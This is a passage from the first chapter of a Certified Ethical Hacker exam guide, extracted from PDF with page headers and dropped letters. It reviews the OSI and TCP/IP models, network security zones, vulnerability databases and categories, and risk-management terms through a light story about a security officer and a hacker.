will. Because, frankly, I don’t know you. I don’t know your work ethic, your attention to
detail, or your ability to effectively calm down to take a test and discern reality from a
certification definition question. All I can do is provide you with the information, wish
you the best of luck, and turn you loose. Now, on with the show.

The OSI Reference Model
Most of us would rather take a ballpeen hammer to our toenails than to hear about the
OSI reference model again. It’s taught up front in every networking class we all had to
take in college, so we’ve all heard it a thousand times over. That said, those of us who
have been around for a while and have taken a certification test or two also understand
that mastery of the OSI model usually results in a few easy test answers—provided you
understand what the questions are asking for. I’m not going to bore you with the same
stuff you’ve heard or read a million times before, because, as stated earlier, you’re supposed
to know this already. What I am going to do, though, is provide a quick rundown for you
to peruse, should you need to refresh your memory.

I thought long and hard about the best way to go over this topic again for our review,
and decided I’d ditch the same old boring method of explaining it. Instead, let’s look at
the 10,000-foot overhead view of a communications session between two computers
depicted in the OSI reference model through the lens of building a network—specifically
by trying to figure out how you would build a network from the ground up. Step in the
Wayback Machine with Sherman, Mr. Peabody, and me, and let’s go back before net-
working was invented. How would you do it?

NOTE Even something as simple as the OSI model can get really
overcomplicated i you read enough into it. For example’s sake, we’re
looking at it in this text as it relates to TCP/IP. While TCP/IP generally rules
the networking world, there are other protocol stacks that do much
the same thing. The OSI model just helps us to talk about networks in a
structured way.

First, looking at those two computers sitting there wanting to talk to one another,
you might consider the basics of what is right in front of your eyes: What will you use
to connect your computers together so they can transmit signals? In other words, what
media would you use? There are several options: copper cabling, glass tubes, even radio
waves, among others. And depending on which one of those you pick, you’re going to
have to figure out how to use them to transmit useable information. How will you get an
electrical signal on the wire to mean something to the computer on the other end? What
aspect of a radio wave—its frequency, amplitude, etc.—can you use to spell out a word
or a color? For that matter, what type of radio wave should you use? On top of all that,
you’ll need to figure out connectors, interfaces, and how to account for interference. And
that’s just Layer 1 (the Physical layer), where everything is simply bits—that is, 1’s and 0’s.

01-ch01.indd 5 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

CEH Certified Ethical Hacker All-in-One Exam Guide

6

Layer 2 then helps answer the questions involved in growing your network. In figuring
out how you would build this whole thing, if you decide to allow more than two nodes to
join, how do you handle addressing? With only two systems, it’s no worry—everything
sent is received by the system on the other end—but if you add three or more systems
to the mix, you’re going to have to figure out how to send the message with a unique
address. And if your media is shared, how would you guarantee everyone gets a chance
to talk, and no one’s message jumbles up anyone else’s? The Data Link layer (Layer 2)
handles this using frames, which encapsulate all the data handed down from the higher
layers. Frames hold addresses that identify a machine inside a particular network.

And what happens if you want to send a message out of your network? It’s one thing
to set up addressing so that each computer knows where all the other computers in the
neighborhood reside, but sooner or later you’re going to want to send a message to another
neighborhood—maybe even another city. And you certainly can’t expect each computer
to know the address of every computer in the whole world. This is where Layer 3 steps
in, with the packet used to hold network addresses and routing information. It works a
lot like ZIP codes on an envelope. While the street address (the physical address from
Layer 2) is used to define the recipient inside the physical network, the network address
from Layer 3 tells routers along the way which neighborhood (network) the message is
intended for.

Other considerations then come into play, like reliable delivery and flow control. You
certainly wouldn’t want a message just blasting out without having any idea if it made it
to the recipient; then again, you may want to, depending on what the message is about.
And you definitely wouldn’t want to overwhelm the media’s ability to handle the mes-
sages you send, so maybe you might not want to put the giant boulder of the message
onto your media all at once, when chopping it up into smaller, more manageable pieces
makes more sense. The next layer, Transport, handles this and more for you. In Layer 4,
the segment handles reliable end-to-end delivery of the message, along with error correc-
tion (through retransmission of missing segments) and flow control.

At this point you’ve set the stage for success. There is media to carry a signal (and
you’ve figured how to encode that signal onto that media), addressing inside and outside
your network is handled, and you’ve taken care of essentials like flow control and reli-
ability. Now it’s time to look upward toward the machines themselves and make sure
they know how to do what they need to do. The next three layers (from the bottom up—
Session, Presentation, and Application) handle the data itself. The Session layer is more
of a theoretical entity, with no real manipulation of the data itself—its job is to open,
maintain, and close a session. The Presentation layer is designed to put a message into a
format all systems can understand. For example, an e-mail crafted in Microsoft Outlook
may not necessarily be received by a machine running Outlook, so it must be trans-
lated into something any receiver can comprehend—like pure ASCII code—for delivery
across a network. The Application layer holds all the protocols that allow a user to access
information on and across a network. For example, FTP allows users to transport files
across networks, SMTP provides for e-mail traffic, and HTTP allows you to surf the
Internet at work while you’re supposed to be doing something else. These three layers
make up the “data layers” of the stack, and they map directly to the Application layer of
the TCP/IP stack. In these three layers, the protocol data unit (PDU) is referred to as data.

01-ch01.indd 6 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

Chapter 1: Getting Started: Essential Knowledge

7

OSI layer Example protocols PDU

Application FTP, HTTP, SMTP, etc.

Presentation AFP, NCP, MIME, etc. Data

Session X.225, SCP, ZIP, etc.

Transport TCP, UDP Segment

Network IP Packet

Data link ARP, CDP, PPP, etc. Frame

USB standards, Bluetooth,
Physical Bit

etc.

Figure 1-1 OSI reerence model

NOTE As with any ield o study, technology has its own lingo and
associated acronym soup. Check the glossary or any acronyms that don’t
immediately register with you.

The layers, and examples of the protocols you’d find in them, are shown in Figure 1-1.

EXAM TIP Demonstrating your OSI knowledge on the test won’t be
something as simple as answering a question about which protocol data
unit goes with which layer. Rather, you’ll be asked questions that knowledge
o the model will help with; knowing what happens at a given layer will
assist you in remembering what tool or protocol the question is asking
about. Anagrams can help your memory: “All People Seem To Need Daily
Planning” will keep the layers straight, and “Do Sergeants Pay For Beer” will
match up the PDUs with the layers.

TCP/IP Overview
Keeping in mind you’re supposed to know this already, we’re not going to spend an inordi-
nate amount of time on this subject. That said, it’s vitally important to your success that
the basics of TCP/IP networking are as ingrained in your neurons as other important
aspects of your life, like maybe Mom’s birthday, the size and bag limit on redfish, the
proper ratio of bourbon to anything you mix it with, and the proper way to place toilet

01-ch01.indd 7 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

CEH Certified Ethical Hacker All-in-One Exam Guide

8

paper on the roller (pull paper down, never up). This will be a quick preview, and we’ll
revisit (and repeat) this in later chapters.

TCP/IP is a set of communications protocols that allows hosts on a network to talk
to one another. This suite of protocols is arranged in a layered stack, much like the OSI
reference model, with each layer performing a specific task. Figure 1-2 shows the TCP/
IP stack.

In keeping with the way this chapter started, let’s avoid a lot of the same stuff you’ve
probably heard a thousand times already and look at an overly simplified example of
a basic web browser exchange, and follow the message from one machine to another
through a TCP/IP network. This way, I hope to hit all the basics you need without bor-
ing you to tears and causing you to skip the rest of this chapter altogether. Keep in mind
there is a whole lot of simultaneous goings-on in any session, so I may take a couple
liberties to speed things along.

Suppose, for example, user Joe wants to get ready for the season opener and decides
to do a little online shopping for his favorite University of Alabama football gear. Joe
begins by opening his browser and typing in a request for his favorite website. His com-
puter now has a data request from the browser that it looks at and determines cannot be
answered internally—that is, not locally to Joe’s system. Why? Because the browser wants
a page that is not stored locally. So, now searching for a network entity to answer the
request, Joe’s system chooses the protocol it knows the answer for this request will come
back on (in this case, port 80 for HTTP) and starts putting together what will become a
session—a bunch of segments sent back and forth to accomplish a goal.

OSI model TCP/IP model Protocols

Application

HTTP, FTP, SNMP, SMTP,
Presentation Application DNS, POP, IMAP, NNTP,

Telnet, SSH, DHCP, etc.

Session

Transport Transport TCP, UDP

Network Internet IP, ICMP

Data link
ARP, L2TP, STP, HDLC,

Network access
FDDI, etc.

Physical

Figure 1-2 TCP/IP stack

01-ch01.indd 8 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

Chapter 1: Getting Started: Essential Knowledge

9

Since this is an Ethernet TCP/IP network, Joe’s computer talks to other systems using
a format of bits arranged in a specific order. These collections of bits in a specific order
are called frames (Figure 1-3 shows a basic Ethernet frame), are built from the inside out,
and rely on information handed down from upper layers. In this example, the Applica-
tion layer “hands down” an HTTP request (data) to the Transport layer. At this layer,
Joe’s computer looks at the HTTP request and (because it knows HTTP usually works
this way) knows this needs to be a connection-oriented session, with stellar reliability to
ensure Joe gets everything he asks for without losing anything. It calls on the Transmis-
sion Control Protocol (TCP) for that. TCP goes out in a series of messages to set up a
communications session with the end station, including a three-step handshake to get
things going. This handshake includes a Synchronize segment (SYN), a Synchronize
Acknowledgment segment (SYN/ACK), and an Acknowledgment segment (ACK). The
first of these—the SYN segment asking the other computer whether it’s awake and wants
to talk—gets handed down for addressing to the Internet layer.

The Internet layer needs to figure out what network the request will be answered from
(after all, there’s no guarantee it’ll be local—it could be anywhere in the world). After
noting the URL typed into the browser isn’t for a local resource, the system turns to
another protocol, Domain Name System (DNS), to ask what IP address belongs to the
URL Joe typed. When that answer comes back, the system builds a packet for delivery
(which consists of the original data request, the TCP header [SYN], and the IP packet
information affixed just before it) and “hands down” the packet to the Network Access
layer for delivery.

Start frame delimiter Frame check sequence

S
Destination Source Length/

Preamble F Data FCS
address address Type

D

8 6 6 2 46–1500 4
bytes bytes bytes bytes bytes bytes

Source and Includes IP packet (with source and
destination MAC destination IP addresses), which in

addresses turn contains TCP segment (with port
numbers and communications flags

such as SYN, ACK, etc.)

Figure 1-3 An Ethernet rame

01-ch01.indd 9 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

CEH Certified Ethical Hacker All-in-One Exam Guide

10

EXAM TIP I know subnetting is not covered right here (we’re going to get to
it in Chapter 3), but you really need to know subnetting. You’ll see anywhere
rom two to ive questions per exam on it. There are dozens and dozens o
good resources on the Internet to help you on this—just search or “learn
subnetting” or something like that and practice.

Here, Joe’s computer needs to find an address on its local subnet to deliver the packet
to (because every computer is only concerned with sending messages to machines inside
its own subnet). It knows its own physical address but has no idea what physical address
belongs to the system that will be answering. For that matter, it doesn’t care what physical
address the remote system has—it only needs a local address it can pass the message to that
will route it to the distant end. Much like delivering a letter through the post office, to get
a letter from me to you, I don’t need to know the full path to get to you—I’ve just got to
drop it in my mailbox (a system local to me) where I know it’ll get picked up and routed.

The IP address of the intended recipient device is known—thanks to DNS—but the
local, physical address is not. To gain that, Joe’s computer employs yet another protocol,
ARP, and when that answer comes back (in this case, the gateway, or local router port),
Joe’s computer can then build the frame and send it out to the network (for you network
purists out there screaming that ARP isn’t needed for networks that the host already
knows should be sent to the default gateway, calm down—it’s just an introductory para-
graph). This process of asking for a local address to forward the frame to is repeated at
every link in the network chain: every time the frame is received by a router along the
way, the router strips off the frame header and trailer and rebuilds the frame based on
new ARP answers for that network chain. Finally, when the frame is received by the des-
tination, the server will keep stripping off and handing up bit, frame, packet, segment,
and data PDUs, which should result—if everything has worked right—in the return of a
SYN/ACK message to get things going.

NOTE This introductory section covers only TCP. UDP—the connectionless,
ire-and-orget transport protocol—has its own segment structure
(called a datagram) and purpose. There are not as many steps with best-
eort delivery, but you’ll ind UDP just as important and valuable to your
knowledge base as TCP.

To see this in action, take a quick look at the frames at each link in the chain from
Joe’s computer to a server in Figure 1-4. Note that the frame is ripped off and replaced
by a new one to deliver the message within the new network; the source and destination
MAC addresses will change, but IPs never do.

EXAM TIP Learn the three-way handshake, expressed as SYN, SYN/ACK,
ACK. Know it. Live it. Love it. You will get asked about this, in many ways
and ormats, several times on your exam.

Although the preceding overview omits tons and tons of details—such as port and
sequence numbers, which will be of great importance to you later—it touches on all

01-ch01.indd 10 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

Chapter 1: Getting Started: Essential Knowledge

11

IP: 172.16.1.1 IP: 192.168.1.1
MAC: 00-00-00-BB-CC-DD MAC: 11-11-11-CC-DD-EE

Source MAC: Destination MAC: Source MAC: Destination MAC:
00-00-00-AA-BB-CC 00-00-00-BB-CC-DD 11-11-11-EE-FF-II 11-11-11-EE-FF-II

Source IP: Destination IP: Source IP: Destination IP:
172.16.1.5 192.168.1.30 172.16.1.5 192.168.1.30

TCP flags and source/destination ports TCP flags and source/destination ports

Data Data

FCS FCS

IP: 172.16.1.5 IP: 192.168.1.30
MAC: 00-00-00-AA-BB-CC MAC: 11-11-11-CC-DD-EE

Figure 1-4 Ethernet rames in transit

the basics for TCP/IP networking. We’ll be covering TCP/IP networking over and over
again, and in more detail, throughout this book, so don’t panic if it’s not all registering
with you yet. Patience, Grasshopper—this is just an introduction, remember?

One final thing I should add here before moving on, however, is the concept of net-
work security zones. The idea behind this is that you can divide your networks in such a
way that you have the opportunity to manage systems with specific security actions to help
control inbound and outbound traffic. You’ve probably heard of security zones before, but
I’d be remiss if I didn’t cover them here. The five security zones ECC defines are as follows:

• Internet Outside the boundary and uncontrolled. You don’t apply security policies
to the Internet. Governments try to all the time, but your organization can’t.

• Internet DMZ The acronym DMZ (for demilitarized zone) comes from the
military and refers to a section of land between two adversarial parties where
there are no weapons or fighting. The idea is you can see an adversary coming
across the DMZ and have time to work up a defense. In networking, the idea
is the same: it’s a controlled buffer network between you and the uncontrolled
chaos of the Internet.

01-ch01.indd 11 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

CEH Certified Ethical Hacker All-in-One Exam Guide

12

NOTE DMZs aren’t just between the Internet and a network; they can be
anywhere an organization decides they want or need a buer—inside
or outside various internets and intranets. DMZ networks provide great
opportunity or good security measures, but can also sometimes become an
Achilles’ heel when too much trust is put into their creation and maintenance.

• Production network zone A very restricted zone that strictly controls direct
access from uncontrolled zones. The PNZ doesn’t hold users.

• Intranet zone A controlled zone that has little-to-no heavy restrictions. This
is not to say everything is wide open on the Intranet zone, but communication
requires fewer strict controls internally.

• Management network zone Usually an area you’d find rife with VLANs and
maybe controlled via IPSec and such. This is a highly secured zone with very
strict policies.

Vulnerabilities
I struggled with just where, when, and how to add a discussion on vulnerabilities in this
book and finally landed on here as the best place. Why? Because this is bedrock, 101-type
information that many in security just assume you already know. I know it seems easy
enough, and you can find vast resources out there to help educate yourself quickly, but it
seems to me if nobody actually shows or tells you the hows and whys on something, how
can you be expected to just know it?

In our romp through “things you’re already supposed to know,” we need to spend
a few cursory moments on what, exactly, defines a vulnerability and a few basics in
particular. A vulnerability is simply a weakness that can be exploited by an attacker to
perform unauthorized actions within a computer or network system. Since our job as
security professionals is to keep our systems safe, and your job as a pen tester is to point
out the weaknesses in security design, it follows that we should all know vulnerability
management well and do our best at keeping vulnerabilities to a minimum.

So how does one know what vulnerabilities are out there and what dangers they might
pose? And is there a ranking system of sorts to determine which vulnerabilities are more
dangerous than others? Glad you asked. First, if you’re looking for lists of vulnerabilities
and resources on them, try a few of the following links to get you started (there are plenty
others; these are just a few of the ones available):

• Microsoft Vulnerability Research (https://www.microsoft.com/en-us/msrc/msvr)

• Security Focus (www.securityfocus.com)

• Hackerstorm (https://www.hackerstorm.co.uk)

• Exploit Database (https://www.exploit-db.com)

• Security Magazine (https://www.securitymagazine.com)

• Trend Micro (https://www.trendmicro.com)

• Dark Reading (https://www.darkreading.com)

• Computerworld (https://www.computerworld.com)

01-ch01.indd 12 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

Chapter 1: Getting Started: Essential Knowledge

13

So it’s one thing to know what vulnerabilities exist, but it should follow that know-
ing what actual risk each poses—how to quantify the danger or risk of each particular
vulnerability—would be an important piece of information in order to plan your secu-
rity resources appropriately. The Common Vulnerability Scoring System (CVSS, https://
www.first.org/cvss/) is a universally adopted method for doing just that; it defines a
method to score vulnerabilities. Per the specification document, CVSS is an

open framework for communicating the characteristics and severity of software
vulnerabilities. CVSS consists of three metric groups: Base, Temporal, and Envi-
ronmental. The Base metrics produce a score ranging from 0 to 10, which can
then be modified by scoring the Temporal and Environmental metrics. A CVSS
score is also represented as a vector string, a compressed textual representation of
the values used to derive the score. The numerical score of a given vulnerability can
then be translated into a qualitative representation (such as low, medium, high,
and critical) to help organizations properly assess and prioritize their vulnerability
management processes.

In addition to having a means to score the risk of each vulnerability, it’s helpful to
have a quick and ready means of listing and searching for what you want. The Common
Vulnerabilities and Exposures (CVE, https://cve.mitre.org/) system provides a relatively
easy to use, free, open to public reference for publicly known vulnerabilities (and, often,
their exposures as well). The National Cybersecurity FFRDC, operated by The MITRE
Corporation, maintains the system, with funding from the National Cyber Security
Division of the U.S. Department of Homeland Security (DHS). The system was offi-
cially launched for the public in September 1999, and provides full lists of all known
vulnerabilities, as well as search options and other information.

CVEs tie into the National Vulnerability Database (NVD, https://nvd.nist.gov/vuln-
metrics/cvss), which is the “U.S. government repository of standards based vulnerability
management data represented using the Security Content Automation Protocol (SCAP).
This data enables automation of vulnerability management, security measurement, and
compliance.” The NVD provides information on vulnerabilities, metrics you can use,
dictionaries, reference materials, and even configuration guides to help protect specific
systems against specific threats.

NOTE Another vulnerability-related site you may see rom time to time is
Common Weakness Enumeration (CWE, https://cwe.mitre.org/). CWE is “a
community-developed list o sotware and hardware weakness types. It
serves as a common language, a measuring stick or security tools, and as a
baseline or weakness identiication, mitigation, and prevention eorts.”

As a pen tester, you need to remain as up to date on active vulnerabilities as possible
(knowledge of new ones pop up all the time). ECC drops all vulnerabilities into a series
of categories, and they are for the most part self-explanatory:

• Misconfiguration A misconfiguration of the service or application settings can
make things easier for an attacker.

01-ch01.indd 13 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

CEH Certified Ethical Hacker All-in-One Exam Guide

14

• Default installations Sometimes the installation of an application or service
using default locations and settings opens a vulnerability (sometimes discovered
well after the release of the application or service).

• Buffer overflows Covered later in this book, buffer overflows are flaws in
execution allowing an attacker to take advantage of bad coding.

• Missing patches (unpatched servers) Despite patching for a known security
flaw being available, many systems are not patched for a variety of reasons,
leaving them vulnerable to attack.

• Design flaws Flaws universal to all operating systems—things like encryption,
data validation, logic flaws, and so on.

• Operating system flaws These are flaws in a specific OS (Windows versus Linux,
and so on).

• Application flaws Flaws inherit to the application coding and function itself.

• Open services Services that are not actively used on the system but remain
open anyway (usually due to negligence or ignorance) can be targets.

• Default passwords Leaving a default password in place on a system is asking
for trouble.

One more consideration here is what exactly you’re expected to do given a vulner-
ability. Just because a vulnerability exists doesn’t necessarily mean your system is at huge
risk. For example, my computer sitting right here in my home office is vulnerable to bear
attack: there is, literally, no way it could survive a mauling by a grizzly bear. But what
are the odds a bear is gonna come through my front door and, maybe enraged by the red
LED stripes across the front and back, attack the system? And what are the odds that,
even if the bear came into the house, I wouldn’t blast it with my 357 Magnum sidearm,
preventing the attack in the first place?

Sure it’s a ridiculous example, but it proves a point: vulnerabilities are always present
on your system, and your job as a security professional is to put as many security controls
as realistically possible in place to prevent their exploitation. Vulnerability and risk assess-
ments are designed specifically to look at potential vulnerabilities on your system versus
the actual likelihood of their exploitation. How hard would it be to exploit the vulner-
ability? Is it even possible for an attacker given the security controls put into place? While
we’re on that subject, what are those security controls and how do they work in prevent-
ing access or exploitation? All of these are questions auditors and security folks deal with
on a daily basis. Start with a solid baseline of your system, a full and complete inventory
of what you have and what those systems are vulnerable to, then plan and act accordingly.

EXAM TIP EC-Council lists a bajillion dierent types o vulnerability
assessments. There’s no need to list them all here, because their descriptor is
exactly what the title says. An assessment looking or wireless vulnerabilities?
Choose Wireless Assessment. Using credentials? It’s a Credentialed Assessment.
Automated eort using a tool versus a manual look? That’d be an Automated
Assessment versus a Manual Assessment. Just use common sense here.

01-ch01.indd 14 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

Chapter 1: Getting Started: Essential Knowledge

15

Lastly, EC-Council lists four main approaches to vulnerability assessments you’ll
probably see mentioned somewhere. The first two approaches are product-based solu-
tions versus service-based solutions. A product-based solution is installed internally to
the organization, on private IP space. While the solution is owned and operated by the
organization, it obviously doesn’t run outside and, therefore, cannot always detect out-
side issues. A service-based solution is one owned and operated by a third party on behalf
of the organization. While portions of the solution may be installed inside the organiza-
tion’s network, it is accessible from the outside—with one drawback being an attacker
may be able to audit the organization externally.

The other two approaches are tree-based assessments versus inference-based assess-
ments. In a tree-based assessment approach, the administrator selects different tactics for
each machine, OS, or component in the network. This approach relies on the admin-
istrator to provide the up-front intelligence correctly and then scans as instructed. An
inference-based approach first builds a port and protocol map of each device and then
selects vulnerability tests and actions accordingly. Official courseware doesn’t provide a
preference to either approach.

NOTE Some o the vulnerability management tools, as listed and deined
by ECC, include Nessus (www.tenable.com), Qualys (www.qualys.com),
GFI LanGuard (www.gi.com), Nikto (https://cirt.net), and OpenVAS
(www.openvas.org).

Security Basics
If there were a subtitle to this section, I would have called it “Ceaseless Definition of
Terms Necessary to Know for Only a Few Questions on the Exam.” There are tons of
these related to security basics, and I gave serious thought to skipping them all and just
leaving you to the glossary. However, because I’m in a good mood and, you know, I
promised my publisher I’d cover everything, I’ll give it a shot here. And, at least for some
of these terms, I’ll try to do so using contextual clues in a story.

Bob and Joe used to be friends in college, but had a falling out over doughnuts. Bob
insisted Krispy Kreme’s were better, but Joe was a Dunkin’ fan, and after much yelling
and tossing of fried dough they became mortal enemies. After graduation they went
their separate ways exploring opportunities as they presented themselves. Eventually Bob
became Security Guy Bob, in charge of security for Orca Pig (OP) Industries, Inc., while
Joe made some bad choices and went on to become Hacker Joe.

After starting his job, Bob noticed most decisions at OP were made in favor of usabil-
ity over functionality and security. He showed a Security, Functionality, and Usability
triangle (see Figure 1-5) to upper management, visually displaying that moving toward
one of the three lessened the other two, and security was sure to suffer long term. Man-
agement noted Bob’s concerns and summarily dismissed them as irrational, as budgets
were tight and business was good.

One day a few weeks later, Hacker Joe woke up and decided he wanted to be naughty.
He went out searching for a target of hack value, so he wouldn’t waste time on something
that didn’t matter. In doing so, he found OP, Inc., and smiled when he saw Bob’s face

01-ch01.indd 15 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

CEH Certified Ethical Hacker All-in-One Exam Guide

16

Security
Figure 1-5
The Security,
Functionality,
and Usability
triangle

Functionality  Usability

on the company directory. He searched and found a target, researching to see if it had
any weaknesses, such as software flaws or logic design errors. A particular vulnerability
did show up on the target, so Joe researched attack vectors and discovered—through his
super-secret hacking background contacts—an attack the developer of some software on
the target apparently didn’t even know about since they hadn’t released any kind of secu-
rity patch or fix to address the problem. This zero-day attack vector required a specific
piece of exploit code Joe could inject through a hacking tactic he thought would work.
After obfuscating this payload and embedding it in an attack, he started.

After pulling off the successful exploit and owning the box, Joe explored what addi-
tional access the machine could grant him. He discovered other targets and vulnerabili-
ties, and successfully configured access to all. His daisy-chaining of network access then
gave him options to set up several machines on multiple networks he could control
remotely to execute really whatever he wanted. Joe could access these bots any time he
wanted, so he decided to prep for more carnage. He also searched publicly available
databases and social media for personally identifiable information (PII) about Bob and
then posted his findings. After this doxing effort, Joe took a nap, dreaming about what
embarrassment Bob would have rain down on him the next day.

EXAM TIP Another antastic bit o terminology rom ECC-land you may see is
threat modeling. It’s exactly what it sounds like and consists o ive sections:
Identiy Security Objectives, Application Overview, Decompose Application,
Identiy Threats, and Identiy Vulnerabilities.

After discovering PII posts about himself, Bob worries that something is amiss, and
wonders if his old nemesis is back and on the attack. He does some digging and discov-
ers Joe’s attack from the previous evening, and immediately engages his incident response
team (IRT) to identify, analyze, prioritize, and resolve the incident. The team first reviews
how Bob detected the attack, and quickly analyzes the exploitation in order to notify the
appropriate stakeholders. The team then works to contain the exploitation, eradicate
residual back doors and such, and coordinate recovery for any lost data or services. After
following this incident management process, the team provides post-incident reporting
and lessons learned to management.

01-ch01.indd 16 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

Chapter 1: Getting Started: Essential Knowledge

17

NOTE Here’s a great three-dollar term you might see on the exam: EISA.
Enterprise Inormation Security Architecture is a collection o requirements
and processes that helps determine how an organization’s inormation
systems are built and how they work.

Post-incident reporting suggested to leadership they focus more attention on security,
and, in one section of the report in particular, that they adopt the means to identify
what risks are present and quantify them on a measurement scale. This risk management
approach would allow them to come up with solutions to mitigate, eliminate, or accept
the identified risks (see Figure 1-6 for a sample risk analysis matrix).

EXAM TIP The risk management phases identiied by EC-Council are Risk
Identiication, Risk Assessment, Risk Treatment, Risk Tracking, and Risk
Review. Each phase is airly sel-explanatory, and you may see mention o
them on your exam.

Identifying organizational assets, the threats to those assets, and their vulnerabilities
would allow the company to explore which countermeasures security personnel could
put into place to minimize risks as much as possible. These security controls would then
greatly increase the security posture of the systems.

NOTE Security controls can also be categorized as physical, technical,
and administrative. Physical controls include things such as guards,
lights, and cameras. Technical controls include security measures such as
encryption, smartcards, and access control lists. Administrative controls
include the training, awareness, and policy eorts that are well intentioned,
comprehensive, and well thought out—and that most employees ignore.
Hackers will combat physical and technical controls to get to their end goal,
but they don’t give a rip about your administrative password policy—unless
it’s actually ollowed.

Figure 1-6
Risk analysis Low  Medium High
matrix

Low Medium  Medium

Low Low  Low

Impact

01-ch01.indd 17 14/09/21 3:52 PM

Probability



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

CEH Certified Ethical Hacker All-in-One Exam Guide

18

Some of these controls were to be put into place to prevent errors or incidents from
occurring in the first place, some were to identify an incident had occurred or was in
progress, and some were designed for after the event to limit the extent of damage and
aid swift recovery. These preventive, detective, and corrective controls can work together to
reduce Joe’s ability to further his side of the great Doughnut Fallout.

EXAM TIP Know preventive, detective, and corrective measures. Examples
o each include authentication (preventive), audits (detective), and backups
and restore options (corrective). You will deinitely be asked about them, in
one way or another.

This effort spurred a greater focus on overall preparation and security. Bob’s quick
action averted what could have been a total disaster, but everyone involved saw the need
for better planning and preparation. Bob and management kicked off an effort to iden-
tify the systems and processes that were critical for operations. This business impact analy-
sis (BIA) included measurements of the maximum tolerable downtime (MTD), which
provided a means to prioritize the recovery of assets should the worst occur. Bob also
branched out and created Orca Pig’s first set of plans and procedures to follow in the
event of a failure or a disaster—security related or not—to get business services back up
and running. His business continuity plan (BCP) included a disaster recovery plan (DRP),
addressing exactly what to do to recover any lost data or services.

Bob also did some research his management should have, and discovered some addi-
tional actions and groovy acronyms they should know and pay attention to. When put-
ting numbers and value to his systems and services, the annualized loss expectancy (ALE)
turned out to be the product of the annualized rate of occurrence (ARO) and the single
loss expectancy (SLE). For his first effort, Bob looked at one system and determined its
worth, including the cost for return to service and any lost revenue during downtime,
was $120,000. Bob made an educated guess on the percentage of loss for this asset if a
specific threat was actually realized and determined the exposure factor (EF) turned out to
be 25 percent. He multiplied this by the asset value and came up with an SLE of $30,000
($120,000 × 25%). He then figured out what he felt would be the probability this loss
would occur in any particular 12-month period. Given statistics he garnered from simi-
larly protected businesses, he thought it could occur once every five years, which gave
him an ARO of 0.2 (one occurrence/five years). By multiplying the estimate of a single
loss versus the number of times it was likely to occur in a year, Bob could generate the
ALE for this asset at $6000 ($30,000 × 0.2). Repeating this across Orca Pig’s assets
turned out to provide valuable information for planning, preparation, and budgeting.

NOTE Keep in mind—or your real job and not necessarily or the exam—that
ARO can be a very diicult metric to establish as it is a static measurement
oten dependent on dynamic inputs. For example, is the attacker ocused on
your system or enterprise? Does a breakthrough exploit exist, or will one exist
or the system or sotware you use? And what about a zero-day exploit on
totally unrelated systems that might still ind its way to you?

01-ch01.indd 18 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

Chapter 1: Getting Started: Essential Knowledge

19

EXAM TIP ALE = SLE × ARO. Know it. Trust me.

At the end of this effort week, Bob relaxed with a Maker’s Mark and an Arturo Fuente
on his back porch, smiling at all the good security work he’d done and enjoying the
bonus his leadership provided as a reward. Joe stewed in his apartment, angry that his
work would now be exponentially harder. But while Bob took the evening to rest on his
laurels, Joe went back to work, scratching and digging at OP’s defenses. “One day I’ll
find a way in. Just wait and see. I won’t stop. Ever.”

NOTE Otentimes security olks tend to get caught up in the 101-level items
and catchphrases we all know. We make sure we investigate vulnerabilities,
manage risks, and establish policies, while we sometimes ignore the
biggest issue we have right in ront o us—the users. ECC calls this out in
User Behavior Analytics (UBA). UBA is a process o tracking user behaviors
themselves, and extrapolating those behaviors in light o malicious activity,
attacks, and rauds. There are behavior-based intrusion detection systems
(IDSs) out there, but don’t overlook UBA in your own security eorts.

Now, wasn’t that better than just reading definitions? Sure, there were a few leaps, and
Bob surely wouldn’t be the guy doing ALE measurements, but it was better than trying
to explain all that otherwise. Every italicized word in this section could possibly show
up on your exam, and now you can just remember this little story and you’ll be ready
for almost anything. But although this was fun, and I did consider continuing the story
throughout the remainder of this book (fiction is so much more entertaining), some of
these topics need a little more than a passing italics reference, so we’ll break here and go
back to more “expected” writing.

CIA
Another bedrock in any security basics discussion is the holy trinity of IT security: con-
fidentiality, integrity, and availability (CIA). Whether you’re an ethical hacker or not,
these three items constitute the hallmarks of security we all strive for. You’ll need to be
familiar with two aspects of each term in order to achieve success as an ethical hacker as
well as on the exam: what the term itself means and which attacks are most commonly
associated with it.

Confidentiality, addressing the secrecy and privacy of information, refers to the mea-
sures taken both to prevent disclosure of information or data to unauthorized individuals
or systems and to ensure the proper disclosure of information to those who are autho-
rized to receive it. Confidentiality for the individual is a must, considering its loss could
result in identity theft, fraud, and loss of money. For a business or government agency,
its loss could be even worse. The use of passwords within some form of authentication
is by far the most common measure taken to ensure confidentiality, and attacks against
passwords are, amazingly enough, the most common confidentiality attacks.

01-ch01.indd 19 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

CEH Certified Ethical Hacker All-in-One Exam Guide

20

For example, your logon to a network usually consists of a user ID and a password,
